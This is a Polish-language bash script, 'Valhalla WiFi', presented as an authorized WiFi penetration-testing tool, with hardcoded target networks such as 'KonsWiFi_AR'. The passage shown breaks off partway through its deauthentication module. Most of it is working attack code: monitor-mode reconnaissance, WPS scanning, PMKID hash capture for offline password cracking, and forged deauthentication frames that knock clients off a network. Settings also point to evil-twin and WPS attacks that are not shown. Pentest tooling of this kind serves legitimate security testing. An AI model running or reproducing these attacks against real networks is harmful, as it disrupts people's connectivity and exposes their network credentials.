#!/usr/bin/env bash
# ==========================================================================
# Valhalla WiFi - Narzędzie do pentestu sieci bezprzewodowych
# Autoryzowane testy penetracyjne WiFi z prowadzeniem krok po kroku
# ==========================================================================

set -euo pipefail

VERSION="1.0.0"

# ---------------------------------------------------------------------------
# Konfiguracja - dostosuj przed użyciem
# ---------------------------------------------------------------------------

# Docelowe sieci (priorytet: _AR = Aruba)
TARGET_SSIDS=("KonsWiFi_AR" "KonsGuest_AR" "KonsWiFi" "KonsGuest")
PRIMARY_SSIDS=("KonsWiFi_AR" "KonsGuest_AR")

# Timeouty (sekundy)
SCAN_TIMEOUT=30
HANDSHAKE_TIMEOUT=120
WPS_TIMEOUT=60
EVILTWIN_TIMEOUT=120
PMKID_TIMEOUT=20

# Limity bezpieczeństwa
DEAUTH_COUNT=5
DEAUTH_MAX=10
WPS_MAX_ATTEMPTS=5

# Porty do testu izolacji
MGMT_PORTS="22,23,80,443,8080,8443,161,162"

# Wymagane narzędzia i paczki do instalacji
declare -A TOOL_PACKAGES=(
    [aircrack-ng]="aircrack-ng"
    [airodump-ng]="aircrack-ng"
    [aireplay-ng]="aircrack-ng"
    [airmon-ng]="aircrack-ng"
    [wash]="reaver"
    [reaver]="reaver"
    [mdk4]="mdk4"
    [hostapd-wpe]="hostapd-wpe"
    [tshark]="tshark"
    [nmap]="nmap"
    [hcxdumptool]="hcxdumptool"
    [hcxpcapngtool]="hcxtools"
    [arp-scan]="arp-scan"
    [iw]="iw"
    [ip]="iproute2"
    [macchanger]="macchanger"
)

# ---------------------------------------------------------------------------
# Kolory i formatowanie
# ---------------------------------------------------------------------------

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
MAGENTA='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
NC='\033[0m'
BOLD='\033[1m'
DIM='\033[2m'

# ---------------------------------------------------------------------------
# Zmienne globalne (ustawiane w runtime)
# ---------------------------------------------------------------------------

WIFI_IFACE=""
MON_IFACE=""
RESULTS_DIR=""
LOG_FILE=""
SCAN_CSV=""
MONITOR_ACTIVE=0
ORIGINAL_MAC=""

# Dane zebrane z rekonesansu (tablice asocjacyjne)
declare -A AP_BSSID
declare -A AP_CHANNEL
declare -A AP_ENCRYPTION
declare -A AP_CIPHER
declare -A AP_AUTH
declare -A AP_POWER
declare -A AP_CLIENTS
declare -A AP_WPS
declare -A AP_MFP
declare -a AP_LIST=()
declare -a CLIENT_LIST=()

# Wyniki testów
declare -A TEST_RESULTS

# ---------------------------------------------------------------------------
# Funkcje pomocnicze
# ---------------------------------------------------------------------------

banner() {
    echo -e "${MAGENTA}"
    cat << 'EOF'

 ██╗   ██╗ █████╗ ██╗     ██╗  ██╗ █████╗ ██╗     ██╗      █████╗
 ██║   ██║██╔══██╗██║     ██║  ██║██╔══██╗██║     ██║     ██╔══██╗
 ██║   ██║███████║██║     ███████║███████║██║     ██║     ███████║
 ╚██╗ ██╔╝██╔══██║██║     ██╔══██║██╔══██║██║     ██║     ██╔══██║
  ╚████╔╝ ██║  ██║███████╗██║  ██║██║  ██║███████╗███████╗██║  ██║
   ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
                    ██╗    ██╗██╗███████╗██╗
                    ██║    ██║██║██╔════╝██║
                    ██║ █╗ ██║██║█████╗  ██║
                    ██║███╗██║██║██╔══╝  ██║
                    ╚███╔███╔╝██║██║     ██║
                     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝

EOF
    echo -e "${NC}"
    echo -e "${CYAN}  Valhalla WiFi Pentest Tool v${VERSION}${NC}"
    echo -e "${DIM}  Autoryzowane testy penetracyjne sieci bezprzewodowych${NC}"
    echo -e "${DIM}  ──────────────────────────────────────────────────────${NC}"
    echo ""
}

log() {
    local level="$1"
    shift
    local msg="$*"
    local ts
    ts=$(date '+%Y-%m-%d %H:%M:%S')

    case "$level" in
        INFO)  echo -e "${CYAN}[i]${NC} ${msg}" ;;
        OK)    echo -e "${GREEN}[✓]${NC} ${msg}" ;;
        WARN)  echo -e "${YELLOW}[!]${NC} ${msg}" ;;
        ERROR) echo -e "${RED}[✗]${NC} ${msg}" ;;
        STEP)  echo -e "\n${BOLD}${BLUE}>>> ${msg}${NC}" ;;
        ASK)   echo -e "${YELLOW}[?]${NC} ${msg}" ;;
    esac

    if [[ -n "${LOG_FILE:-}" ]]; then
        echo "[${ts}] [${level}] ${msg}" | sed 's/\x1b\[[0-9;]*m//g' >> "$LOG_FILE"
    fi
}

log_result() {
    local test_name="$1"
    local result="$2"
    local details="${3:-}"
    TEST_RESULTS["$test_name"]="$result"
    if [[ "$result" == "PASS" ]]; then
        log OK "TEST: ${test_name} -> ${GREEN}PASS${NC} ${details}"
    elif [[ "$result" == "FAIL" ]]; then
        log ERROR "TEST: ${test_name} -> ${RED}FAIL${NC} ${details}"
    else
        log WARN "TEST: ${test_name} -> ${YELLOW}${result}${NC} ${details}"
    fi
}

separator() {
    echo -e "${DIM}──────────────────────────────────────────────────────────${NC}"
}

press_enter() {
    echo ""
    echo -ne "${GRAY}Naciśnij ENTER aby kontynuować...${NC}"
    read -r
}

confirm() {
    local msg="$1"
    echo -ne "${YELLOW}[?]${NC} ${msg} [t/N]: "
    read -r answer
    [[ "$answer" =~ ^[tTyY]$ ]]
}

explain() {
    echo ""
    echo -e "${CYAN}╭─ Co teraz robimy? ─────────────────────────────────────╮${NC}"
    echo -e "${CYAN}│${NC}"
    while IFS= read -r line; do
        printf "${CYAN}│${NC}  %s\n" "$line"
    done <<< "$1"
    echo -e "${CYAN}│${NC}"
    echo -e "${CYAN}╰────────────────────────────────────────────────────────╯${NC}"
    echo ""
}

select_from_list() {
    local prompt="$1"
    shift
    local options=("$@")
    local choice

    echo -e "\n${BOLD}${prompt}${NC}"
    for i in "${!options[@]}"; do
        echo -e "  ${CYAN}$((i+1)))${NC} ${options[$i]}"
    done
    echo ""
    while true; do
        echo -ne "${YELLOW}[?]${NC} Wybierz numer [1-${#options[@]}]: "
        read -r choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#options[@]} )); then
            echo "$((choice-1))"
            return 0
        fi
        echo -e "${RED}Nieprawidłowy wybór, spróbuj ponownie.${NC}"
    done
}

wait_with_progress() {
    local seconds="$1"
    local msg="${2:-Czekam}"
    local pid="${3:-}"

    for ((i=1; i<=seconds; i++)); do
        if [[ -n "$pid" ]] && ! kill -0 "$pid" 2>/dev/null; then
            break
        fi
        local pct=$((i * 100 / seconds))
        local filled=$((pct / 5))
        local empty=$((20 - filled))
        local bar_fill="" bar_empty=""
        local j
        for ((j=0; j<filled; j++)); do bar_fill+="#"; done
        for ((j=0; j<empty; j++)); do bar_empty+="."; done
        printf "\r  ${GRAY}${msg} [${GREEN}%s${GRAY}%s${GRAY}] %d/%ds${NC}" \
            "$bar_fill" "$bar_empty" "$i" "$seconds"
        sleep 1
    done
    echo ""
}

# ---------------------------------------------------------------------------
# Cleanup i trap
# ---------------------------------------------------------------------------

cleanup() {
    echo ""
    log WARN "Czyszczenie i przywracanie interfejsu..."

    # Kill background processes
    jobs -p 2>/dev/null | while read -r pid; do
        kill "$pid" 2>/dev/null || true
    done

    # Stop monitor mode
    if [[ $MONITOR_ACTIVE -eq 1 && -n "$MON_IFACE" ]]; then
        airmon-ng stop "$MON_IFACE" &>/dev/null || true
        log OK "Monitor mode wyłączony na ${MON_IFACE}"
        MONITOR_ACTIVE=0
    fi

    # Kill common leftover processes
    for proc in airodump-ng aireplay-ng hostapd-wpe hcxdumptool mdk4; do
        pkill -f "$proc" 2>/dev/null || true
    done

    # Restart network manager
    systemctl start NetworkManager 2>/dev/null || true

    if [[ -n "${LOG_FILE:-}" ]]; then
        log OK "Logi zapisane w: ${LOG_FILE}"
    fi

    echo -e "${GREEN}[✓] Cleanup zakończony.${NC}"
}

trap cleanup EXIT
trap 'echo -e "\n${RED}Przerwano (Ctrl+C). Czyszczenie...${NC}"; exit 1' INT TERM

# ---------------------------------------------------------------------------
# Pre-flight checks
# ---------------------------------------------------------------------------

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[✗] Ten skrypt wymaga uprawnień root!${NC}"
        echo -e "${YELLOW}    Uruchom: sudo ./valhalla_wifi.sh${NC}"
        exit 1
    fi
}

check_authorization() {
    echo -e "${RED}${BOLD}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║  UWAGA: WYMÓG AUTORYZACJI                              ║"
    echo "║                                                        ║"
    echo "║  Testy penetracyjne WiFi BEZ pisemnej autoryzacji      ║"
    echo "║  właściciela sieci są NIELEGALNE (art. 267 KK).        ║"
    echo "║                                                        ║"
    echo "║  Upewnij się, że posiadasz:                            ║"
    echo "║  - Pisemne zlecenie/zgodę na testy                    ║"
    echo "║  - Określony zakres testów                             ║"
    echo "║  - Określone sieci docelowe                            ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"

    if ! confirm "Czy posiadasz pisemną autoryzację na przeprowadzenie testów?"; then
        echo -e "${RED}Anulowano. Uzyskaj autoryzację przed rozpoczęciem testów.${NC}"
        exit 1
    fi
    log OK "Autoryzacja potwierdzona przez operatora."
}

install_missing_tools() {
    local missing=()
    local missing_packages=()

    log STEP "Sprawdzanie wymaganych narzędzi..."

    for tool in "${!TOOL_PACKAGES[@]}"; do
        if command -v "$tool" &>/dev/null; then
            echo -e "  ${GREEN}[✓]${NC} ${tool}"
        else
            echo -e "  ${RED}[✗]${NC} ${tool} ${DIM}(brak)${NC}"
            missing+=("$tool")
            local pkg="${TOOL_PACKAGES[$tool]}"
            if [[ ! " ${missing_packages[*]} " =~ " ${pkg} " ]]; then
                missing_packages+=("$pkg")
            fi
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        echo ""
        log WARN "Brakujące narzędzia: ${missing[*]}"
        log INFO "Paczki do zainstalowania: ${missing_packages[*]}"

        if confirm "Zainstalować brakujące paczki automatycznie?"; then
            log INFO "Aktualizacja listy pakietów..."
            apt-get update -qq

            for pkg in "${missing_packages[@]}"; do
                log INFO "Instaluję: ${pkg}..."
                if apt-get install -y -qq "$pkg"; then
                    log OK "Zainstalowano: ${pkg}"
                else
                    log ERROR "Nie udało się zainstalować: ${pkg}"
                fi
            done

            # Verify again
            local still_missing=()
            for tool in "${missing[@]}"; do
                if ! command -v "$tool" &>/dev/null; then
                    still_missing+=("$tool")
                fi
            done

            if [[ ${#still_missing[@]} -gt 0 ]]; then
                log ERROR "Nadal brakuje: ${still_missing[*]}"
                log WARN "Niektóre moduły mogą nie działać poprawnie."
                press_enter
            else
                log OK "Wszystkie narzędzia zainstalowane."
            fi
        else
            log WARN "Kontynuuję bez brakujących narzędzi. Niektóre moduły mogą nie działać."
            press_enter
        fi
    else
        log OK "Wszystkie narzędzia są dostępne."
    fi
}

select_interface() {
    log STEP "Wykrywanie interfejsów WiFi..."

    local ifaces=()
    local iface_info=()

    while IFS= read -r line; do
        local iface
        iface=$(echo "$line" | awk '{print $2}')
        if [[ -n "$iface" ]]; then
            local driver phy
            driver=$(ethtool -i "$iface" 2>/dev/null | grep "driver:" | awk '{print $2}' || echo "?")
            phy=$(iw dev "$iface" info 2>/dev/null | grep "wiphy" | awk '{print $2}' || echo "?")
            ifaces+=("$iface")
            iface_info+=("${iface} (driver: ${driver}, phy: ${phy})")
        fi
    done < <(iw dev 2>/dev/null | grep "Interface")

    if [[ ${#ifaces[@]} -eq 0 ]]; then
        log ERROR "Nie znaleziono żadnego interfejsu WiFi!"
        echo -e "${YELLOW}Upewnij się, że karta WiFi jest podłączona i rozpoznawana.${NC}"
        echo -e "${DIM}Sprawdź: lsusb, lspci, dmesg | tail${NC}"
        exit 1
    fi

    if [[ ${#ifaces[@]} -eq 1 ]]; then
        WIFI_IFACE="${ifaces[0]}"
        log OK "Znaleziono interfejs: ${WIFI_IFACE}"
    else
        local idx
        idx=$(select_from_list "Znaleziono ${#ifaces[@]} interfejsy WiFi:" "${iface_info[@]}")
        WIFI_IFACE="${ifaces[$idx]}"
        log OK "Wybrany interfejs: ${WIFI_IFACE}"
    fi

    # Check monitor mode support
    log INFO "Sprawdzanie obsługi trybu monitor..."
    if iw phy "$(iw dev "$WIFI_IFACE" info 2>/dev/null | grep wiphy | awk '{print "phy"$2}')" info 2>/dev/null | grep -q "monitor"; then
        log OK "Interfejs ${WIFI_IFACE} obsługuje tryb monitor."
    else
        log WARN "Nie mogę potwierdzić obsługi trybu monitor dla ${WIFI_IFACE}."
        log WARN "Spróbuję kontynuować - może się udać mimo to."
    fi
}

setup_results_dir() {
    local timestamp
    timestamp=$(date '+%Y-%m-%d_%H%M%S')
    RESULTS_DIR="$(pwd)/valhalla_wifi_results/${timestamp}"
    mkdir -p "$RESULTS_DIR"
    LOG_FILE="${RESULTS_DIR}/valhalla_wifi.log"
    touch "$LOG_FILE"
    log OK "Katalog wyników: ${RESULTS_DIR}"
}

# ---------------------------------------------------------------------------
# Monitor mode management
# ---------------------------------------------------------------------------

start_monitor() {
    if [[ $MONITOR_ACTIVE -eq 1 ]]; then
        log INFO "Monitor mode już aktywny na ${MON_IFACE}"
        return 0
    fi

    log INFO "Włączanie trybu monitor na ${WIFI_IFACE}..."

    # Kill interfering processes
    airmon-ng check kill &>/dev/null || true
    sleep 1

    # Start monitor mode
    if airmon-ng start "$WIFI_IFACE" &>/dev/null; then
        # Detect new interface name
        MON_IFACE="${WIFI_IFACE}mon"
        if ! ip link show "$MON_IFACE" &>/dev/null; then
            MON_IFACE="$WIFI_IFACE"
        fi
        if ! ip link show "$MON_IFACE" &>/dev/null; then
            # Try to find it
            MON_IFACE=$(iw dev 2>/dev/null | grep "Interface" | awk '{print $2}' | grep -E "mon|wlan" | head -1 || true)
        fi

        if [[ -n "$MON_IFACE" ]] && ip link show "$MON_IFACE" &>/dev/null; then
            MONITOR_ACTIVE=1
            log OK "Monitor mode aktywny: ${MON_IFACE}"
        else
            log ERROR "Nie mogę znaleźć interfejsu monitor mode!"
            return 1
        fi
    else
        log ERROR "Nie udało się włączyć monitor mode!"
        log WARN "Spróbuj ręcznie: airmon-ng start ${WIFI_IFACE}"
        return 1
    fi
}

stop_monitor() {
    if [[ $MONITOR_ACTIVE -eq 1 && -n "$MON_IFACE" ]]; then
        log INFO "Wyłączanie trybu monitor..."
        airmon-ng stop "$MON_IFACE" &>/dev/null || true
        MONITOR_ACTIVE=0
        systemctl start NetworkManager 2>/dev/null || true
        sleep 2
        log OK "Monitor mode wyłączony. NetworkManager uruchomiony."
    fi
}

# ---------------------------------------------------------------------------
# Moduł 1: Rekonesans
# ---------------------------------------------------------------------------

module_recon() {
    log STEP "MODUŁ 1: REKONESANS SIECI WiFi"
    separator

    explain "Skanujemy otoczenie w poszukiwaniu sieci bezprzewodowych.
Karta WiFi przejdzie w tryb 'monitor' - nasłuchuje WSZYSTKIE
pakiety WiFi w zasięgu. Zbieramy:
- Nazwy sieci (SSID) i ich identyfikatory (BSSID)
- Kanały, szyfrowanie, siłę sygnału
- Liczbę podłączonych klientów
- Szczególnie szukamy: ${TARGET_SSIDS[*]}"

    if ! confirm "Rozpocząć skanowanie?"; then
        log WARN "Rekonesans anulowany."
        return 1
    fi

    start_monitor || return 1

    local scan_prefix="${RESULTS_DIR}/recon_scan"
    SCAN_CSV="${scan_prefix}-01.csv"

    log INFO "Skanowanie przez ${SCAN_TIMEOUT}s... (airodump-ng)"

    # Run airodump-ng with timeout
    timeout "${SCAN_TIMEOUT}" airodump-ng \
        --write "$scan_prefix" \
        --write-interval 5 \
        --output-format csv \
        "$MON_IFACE" &>/dev/null &
    local scan_pid=$!

    wait_with_progress "$SCAN_TIMEOUT" "Skanowanie sieci" "$scan_pid"
    kill "$scan_pid" 2>/dev/null || true
    wait "$scan_pid" 2>/dev/null || true
    sleep 1

    # Parse results
    if [[ ! -f "$SCAN_CSV" ]]; then
        log ERROR "Plik CSV nie został wygenerowany!"
        log WARN "Sprawdź, czy interfejs ${MON_IFACE} działa poprawnie."
        return 1
    fi

    parse_scan_results "$SCAN_CSV"
    display_scan_results
    log OK "Wyniki rekonesansu zapisane w: ${SCAN_CSV}"

    press_enter
    return 0
}

parse_scan_results() {
    local csv_file="$1"
    local in_ap_section=1
    local in_client_section=0
    local ap_idx=0

    AP_LIST=()
    CLIENT_LIST=()

    while IFS= read -r line; do
        # Skip empty lines
        [[ -z "${line// /}" ]] && continue

        # Detect section switch
        if [[ "$line" == *"Station MAC"* ]]; then
            in_ap_section=0
            in_client_section=1
            continue
        fi

        # Skip header
        [[ "$line" == *"BSSID"*"First"* ]] && continue
        [[ "$line" == *"Station"*"First"* ]] && continue

        if [[ $in_ap_section -eq 1 ]]; then
            local bssid channel privacy cipher auth power essid
            bssid=$(echo "$line" | cut -d',' -f1 | xargs 2>/dev/null || true)
            channel=$(echo "$line" | cut -d',' -f4 | xargs 2>/dev/null || true)
            privacy=$(echo "$line" | cut -d',' -f6 | xargs 2>/dev/null || true)
            cipher=$(echo "$line" | cut -d',' -f7 | xargs 2>/dev/null || true)
            auth=$(echo "$line" | cut -d',' -f8 | xargs 2>/dev/null || true)
            power=$(echo "$line" | cut -d',' -f9 | xargs 2>/dev/null || true)
            essid=$(echo "$line" | cut -d',' -f14- | xargs 2>/dev/null || true)

            # Validate BSSID format
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                local key="${ap_idx}"
                AP_LIST+=("$key")
                AP_BSSID["$key"]="$bssid"
                AP_CHANNEL["$key"]="$channel"
                AP_ENCRYPTION["$key"]="$privacy"
                AP_CIPHER["$key"]="$cipher"
                AP_AUTH["$key"]="$auth"
                AP_POWER["$key"]="$power"
                AP_CLIENTS["$key"]="0"

                # Clean ESSID
                essid="${essid#"${essid%%[![:space:]]*}"}"
                essid="${essid%"${essid##*[![:space:]]}"}"
                AP_BSSID["${key}_essid"]="$essid"

                ((ap_idx++))
            fi
        elif [[ $in_client_section -eq 1 ]]; then
            local sta_mac sta_bssid
            sta_mac=$(echo "$line" | cut -d',' -f1 | xargs 2>/dev/null || true)
            sta_bssid=$(echo "$line" | cut -d',' -f6 | xargs 2>/dev/null || true)

            if [[ "$sta_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                CLIENT_LIST+=("${sta_mac}|${sta_bssid}")

                # Count clients per AP
                for key in "${AP_LIST[@]}"; do
                    if [[ "${AP_BSSID[$key]}" == "$sta_bssid" ]]; then
                        AP_CLIENTS["$key"]=$(( ${AP_CLIENTS[$key]} + 1 ))
                    fi
                done
            fi
        fi
    done < "$csv_file"
}

display_scan_results() {
    echo ""
    log STEP "Wyniki skanowania"

    # Target networks first
    local found_targets=0
    echo -e "\n${BOLD}${GREEN}=== SIECI DOCELOWE ===${NC}"
    printf "${BOLD}%-4s %-20s %-20s %-5s %-15s %-10s %-6s %-4s${NC}\n" \
        "#" "SSID" "BSSID" "CH" "Szyfrowanie" "Auth" "Sygnał" "Kl."
    separator

    for key in "${AP_LIST[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        for target in "${TARGET_SSIDS[@]}"; do
            if [[ "$essid" == "$target" ]]; then
                local is_primary=""
                for prim in "${PRIMARY_SSIDS[@]}"; do
                    [[ "$essid" == "$prim" ]] && is_primary="${GREEN}★${NC} "
                done
                printf "${is_primary}%-4s ${CYAN}%-20s${NC} %-20s %-5s %-15s %-10s %-6s %-4s\n" \
                    "$((key+1))" \
                    "$essid" \
                    "${AP_BSSID[$key]}" \
                    "${AP_CHANNEL[$key]}" \
                    "${AP_ENCRYPTION[$key]}" \
                    "${AP_AUTH[$key]}" \
                    "${AP_POWER[$key]}dBm" \
                    "${AP_CLIENTS[$key]}"
                ((found_targets++))

                # Log to file
                echo "TARGET: SSID=${essid} BSSID=${AP_BSSID[$key]} CH=${AP_CHANNEL[$key]} ENC=${AP_ENCRYPTION[$key]} AUTH=${AP_AUTH[$key]} PWR=${AP_POWER[$key]} CLIENTS=${AP_CLIENTS[$key]}" >> "$LOG_FILE"
            fi
        done
    done

    if [[ $found_targets -eq 0 ]]; then
        echo -e "  ${YELLOW}Nie znaleziono żadnej sieci docelowej w zasięgu!${NC}"
        log WARN "Brak sieci docelowych w zasięgu."
    else
        echo ""
        log OK "Znaleziono ${found_targets} sieci docelowych."
    fi

    # All other networks
    echo -e "\n${BOLD}=== WSZYSTKIE SIECI (${#AP_LIST[@]} total) ===${NC}"
    printf "${BOLD}%-4s %-25s %-20s %-5s %-15s %-6s${NC}\n" \
        "#" "SSID" "BSSID" "CH" "Szyfrowanie" "Sygnał"
    separator

    for key in "${AP_LIST[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        [[ -z "$essid" ]] && essid="<ukryte>"
        printf "%-4s %-25s %-20s %-5s %-15s %-6s\n" \
            "$((key+1))" \
            "$essid" \
            "${AP_BSSID[$key]}" \
            "${AP_CHANNEL[$key]}" \
            "${AP_ENCRYPTION[$key]}" \
            "${AP_POWER[$key]}dBm"
    done

    echo ""
    log INFO "Klienci w zasięgu: ${#CLIENT_LIST[@]}"
}

# ---------------------------------------------------------------------------
# Moduł 2: Analiza zabezpieczeń
# ---------------------------------------------------------------------------

module_security_analysis() {
    log STEP "MODUŁ 2: ANALIZA ZABEZPIECZEŃ"
    separator

    explain "Analizujemy zabezpieczenia znalezionych sieci docelowych:
- Typ szyfrowania (WPA2-Personal, WPA2-Enterprise, WPA3)
- Czy jest włączony WPS (WiFi Protected Setup) - częsta podatność
- Czy jest PMKID (pozwala złamać hasło bez klientów)
- Czy działa MFP/802.11w (ochrona przed deautentykacją)
- Metoda uwierzytelniania (PSK vs 802.1X Enterprise)"

    if [[ ${#AP_LIST[@]} -eq 0 ]]; then
        log WARN "Brak danych rekonesansu. Uruchom najpierw Moduł 1."
        press_enter
        return 1
    fi

    # Find target APs
    local target_keys=()
    for key in "${AP_LIST[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        for target in "${TARGET_SSIDS[@]}"; do
            [[ "$essid" == "$target" ]] && target_keys+=("$key")
        done
    done

    if [[ ${#target_keys[@]} -eq 0 ]]; then
        log WARN "Nie znaleziono sieci docelowych. Uruchom najpierw rekonesans."
        press_enter
        return 1
    fi

    echo -e "\n${BOLD}Analiza szyfrowania:${NC}"
    separator

    for key in "${target_keys[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        local enc="${AP_ENCRYPTION[$key]}"
        local auth="${AP_AUTH[$key]}"
        local cipher="${AP_CIPHER[$key]}"

        echo -e "\n  ${CYAN}${BOLD}${essid}${NC} (${AP_BSSID[$key]})"
        echo -e "  Szyfrowanie: ${enc}"
        echo -e "  Szyfr:       ${cipher}"
        echo -e "  Auth:        ${auth}"

        # Analyze encryption strength
        if [[ "$enc" == *"WPA3"* ]]; then
            echo -e "  Ocena:       ${GREEN}SILNE${NC} - WPA3 (SAE)"
            log_result "Szyfrowanie_${essid}" "PASS" "WPA3 SAE"
        elif [[ "$enc" == *"WPA2"* && "$auth" == *"MGT"* ]]; then
            echo -e "  Ocena:       ${GREEN}SILNE${NC} - WPA2 Enterprise (802.1X)"
            log_result "Szyfrowanie_${essid}" "PASS" "WPA2 Enterprise"
        elif [[ "$enc" == *"WPA2"* && "$auth" == *"PSK"* ]]; then
            echo -e "  Ocena:       ${YELLOW}ŚREDNIE${NC} - WPA2 PSK (siła zależy od hasła)"
            log_result "Szyfrowanie_${essid}" "INFO" "WPA2 PSK"
        elif [[ "$enc" == *"WEP"* ]]; then
            echo -e "  Ocena:       ${RED}SŁABE${NC} - WEP (łatwe do złamania!)"
            log_result "Szyfrowanie_${essid}" "FAIL" "WEP"
        elif [[ "$enc" == *"OPN"* ]]; then
            echo -e "  Ocena:       ${RED}BRAK${NC} - Sieć otwarta!"
            log_result "Szyfrowanie_${essid}" "FAIL" "Open network"
        fi
    done

    # WPS scan
    echo ""
    log INFO "Skanowanie WPS (wash)..."
    start_monitor || return 1

    local wps_file="${RESULTS_DIR}/wps_scan.txt"
    timeout 15 wash -i "$MON_IFACE" 2>/dev/null > "$wps_file" &
    local wash_pid=$!
    wait_with_progress 15 "Skan WPS" "$wash_pid"
    kill "$wash_pid" 2>/dev/null || true
    wait "$wash_pid" 2>/dev/null || true

    echo -e "\n${BOLD}Status WPS:${NC}"
    separator

    for key in "${target_keys[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        local bssid="${AP_BSSID[$key]}"

        if grep -qi "$bssid" "$wps_file" 2>/dev/null; then
            local wps_locked
            wps_locked=$(grep -i "$bssid" "$wps_file" | awk '{print $4}' || echo "?")
            if [[ "$wps_locked" == "Yes" ]]; then
                echo -e "  ${essid}: WPS ${YELLOW}WŁĄCZONE${NC} (zablokowane)"
                AP_WPS["$key"]="locked"
                log_result "WPS_${essid}" "INFO" "WPS enabled but locked"
            else
                echo -e "  ${essid}: WPS ${RED}WŁĄCZONE (niezablokowane!)${NC}"
                AP_WPS["$key"]="enabled"
                log_result "WPS_${essid}" "FAIL" "WPS enabled and unlocked"
            fi
        else
            echo -e "  ${essid}: WPS ${GREEN}WYŁĄCZONE${NC}"
            AP_WPS["$key"]="disabled"
            log_result "WPS_${essid}" "PASS" "WPS disabled"
        fi
    done

    # PMKID test
    echo ""
    log INFO "Test PMKID (hcxdumptool, ${PMKID_TIMEOUT}s)..."

    local pmkid_file="${RESULTS_DIR}/pmkid_scan.pcapng"
    if command -v hcxdumptool &>/dev/null; then
        timeout "$PMKID_TIMEOUT" hcxdumptool -i "$MON_IFACE" \
            -o "$pmkid_file" \
            --active_beacon --enable_status=15 2>/dev/null &
        local pmkid_pid=$!
        wait_with_progress "$PMKID_TIMEOUT" "Test PMKID" "$pmkid_pid"
        kill "$pmkid_pid" 2>/dev/null || true
        wait "$pmkid_pid" 2>/dev/null || true

        if [[ -f "$pmkid_file" && -s "$pmkid_file" ]]; then
            local hash_file="${RESULTS_DIR}/pmkid_hashes.txt"
            if hcxpcapngtool -o "$hash_file" "$pmkid_file" 2>/dev/null; then
                if [[ -f "$hash_file" && -s "$hash_file" ]]; then
                    local pmkid_count
                    pmkid_count=$(wc -l < "$hash_file")
                    echo -e "  ${RED}Przechwycono ${pmkid_count} hash(y) PMKID!${NC}"
                    log_result "PMKID" "FAIL" "Captured ${pmkid_count} PMKID hashes"
                else
                    echo -e "  ${GREEN}Brak PMKID - sieć nie jest podatna.${NC}"
                    log_result "PMKID" "PASS" "No PMKID captured"
                fi
            fi
        else
            echo -e "  ${GREEN}Brak PMKID w zasięgu.${NC}"
            log_result "PMKID" "PASS" "No PMKID captured"
        fi
    else
        log WARN "hcxdumptool niedostępny - pomijam test PMKID."
    fi

    # MFP/802.11w analysis
    echo -e "\n${BOLD}Ochrona ramek zarządzania (MFP/802.11w):${NC}"
    separator
    for key in "${target_keys[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        # Note: airodump CSV doesn't reliably show MFP, we'll check in deauth test
        echo -e "  ${essid}: ${YELLOW}Do weryfikacji w teście deauth (Moduł 3)${NC}"
        AP_MFP["$key"]="unknown"
    done

    echo ""
    log OK "Analiza zabezpieczeń zakończona."
    press_enter
    return 0
}

# ---------------------------------------------------------------------------
# Moduł 3: Test deautentykacji
# ---------------------------------------------------------------------------

module_deauth_test() {
    log STEP "MODUŁ 3: TEST DEAUTENTYKACJI"
    separator

    explain "Testujemy odporność sieci na atak deautentykacji.
Deautentykacja to technika, w której wysyłamy fałszywe ramki
WiFi, które powodują odłączenie klienta od sieci.

Sprawdzamy:
- Czy klienci mogą zostać odłączeni (deauth atak)
- Czy MFP/802.11w chroni przed tym atakiem
- Jak szybko klienci wracają do sieci

UWAGA: Wyślemy tylko ${DEAUTH_COUNT} ramek deauth (nie flooding)."

    start_monitor || return 1

    # Select target AP
    local target_keys=()
    local target_names=()
    for key in "${AP_LIST[@]}"; do
        local essid="${AP_BSSID[${key}_essid]}"
        for target in "${TARGET_SSIDS[@]}"; do
            if [[ "$essid" == "$target" ]]; then
                target_keys+=("$key")
                target_names+=("${essid} (${AP_BSSID[$key]}, CH:${AP_CHANNEL[$key]}, Klienci:${AP_CLIENTS[$key]})")
            fi
        done
    done

    if [[ ${#target_keys[@]} -eq 0 ]]; then
        log WARN "Brak sieci docelowych. Uruchom najpierw rekonesans."
        press_enter
        return 1
    fi

    local idx
    idx=$(select_from_list "Wybierz sieć do testu deauth:" "${target_names[@]}")
    local selected_key="${target_keys[$idx]}"
    local selected_bssid="${AP_BSSID[$selected_key]}"
    local selected_channel="${AP_CHANNEL[$selected_key]}"
    local selected_essid="${AP_BSSID[${selected_key}_essid]}"

    log INFO "Cel: ${selected_essid} (${selected_bssid}) na kanale ${selected_channel}"

    # Set channel
    iw dev "$MON_IFACE" set channel "$selected_channel" 2>/dev/null || \
        iwconfig "$MON_IFACE" channel "$selected_channel" 2>/dev/null || true

    # Find clients on this AP
    local ap_clients=()
    for client_entry in "${CLIENT_LIST[@]}"; do
        local sta_mac="${client_entry%%|*}"
        local sta_bssid="${client_entry##*|}"
        sta_bssid=$(echo "$sta_bssid" | xargs 2>/dev/null || true)
        if [[ "$sta_bssid" == "$selected_bssid" ]]; then
            ap_clients+=("$sta_mac")
        fi
    done

    if [[ ${#ap_clients[@]} -eq 0 ]]; then
        log WARN "Brak klientów podłączonych do tej sieci."
        log INFO "Test broadcast deauth (wszyscy klienci)..."

        if ! confirm "Wysłać ${DEAUTH_COUNT} ramek broadcast deauth?"; then
            log WARN "Test anulowany."
            press_enter
            return 1
        fi

